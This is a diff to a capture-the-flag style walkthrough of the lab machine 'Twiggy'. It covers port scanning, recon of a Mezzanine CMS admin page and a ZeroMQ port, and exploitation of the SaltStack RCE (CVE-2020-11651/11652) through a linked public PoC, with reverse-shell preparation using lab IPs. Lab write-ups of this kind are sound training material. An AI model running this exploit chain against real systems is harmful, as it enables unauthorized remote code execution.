@@ -58,16 +58,26 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 108.93 seconds
 ```
 
-Of course we open the port 80 first
-![[images/Twiggy-1744177123093.jpeg]]
+### 3. Web Recon
 
-Oh look there's an admin interface button
+Browsing to `http://192.168.145.62:80`:
+
+- Shows a site using **Mezzanine CMS**
+    
+- There's an **admin interface**, but login fails.
+
+![screenshot](images/Twiggy-1744177123093.jpeg)
+
+
+Tried some login guesses — nothing obvious.
 
 ![[images/Twiggy-1744178077284.jpeg]]
 
-After trying out the admin... nah it aint that easy. So we take a look at port 8000, time to do some research on ZeroMQ ZMTP 2.0 as well 
+Moved on to check `http://192.168.145.62:8000/` — it returns JSON but no content: time to do some research on ZeroMQ ZMTP 2.0 as well 
 
 ![[images/Twiggy-1744178200043.jpeg]]
+
+### 🔥 Exploitation: SaltStack RCE (CVE-2020-11651 / 11652)
 
 Apparently we have something good on [exploitDB](https://www.exploit-db.com/exploits/48421) , let's just run Saltstack 3000.1 - Remote Code Execution like some script kiddie, and my guy actually uploaded a [poc](https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py) for it... good stuff
 
@@ -82,6 +92,7 @@ source salt-venv/bin/activate
 pip install salt==3002 msgpack PyYAML pyzmq jinja2 tornado requests
 ```
 
+🛠️ Reverse Shell Prep
 We will prep it by noting down:
 - **Kali IP**: `192.168.45.197`
 - **Target IP**: `192.168.145.62`
@@ -103,7 +114,7 @@ python3 exploit.py \
 
 ![[images/Twiggy-1744181043545.jpeg]]
 
-Listener side:
+Shell caught on listener:
 
 ![[images/Twiggy-1744181018801.jpeg]]
 
